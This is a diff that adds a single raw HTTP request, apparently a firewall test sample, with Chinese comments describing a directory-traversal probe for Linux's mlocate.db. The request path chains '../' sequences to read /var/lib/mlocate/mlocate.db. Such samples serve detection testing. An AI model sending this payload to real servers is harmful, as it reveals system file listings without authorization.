@@ -1,0 +1,9 @@
+# 目录遍历_mlocate.db
+# mlocate.db 是 Linux 系统上的一个数据库文件，用于存储与文件和目录相关的元数据信息。这个数据库通常由 mlocate 工具维护，用于提供快速的本地文件搜索功能。
+GET /../../../../../../../../../../../../var/lib/mlocate/mlocate.db?acid=80050825&bid=hd_tag_m8mv24l2 HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv24l2
+RM-PRO-Token: 2090ff2919e5e6412fad7a4296e20d72
+RM-PRO-Time: 1742808390687
+User-Agent: curl/7.83.1
+
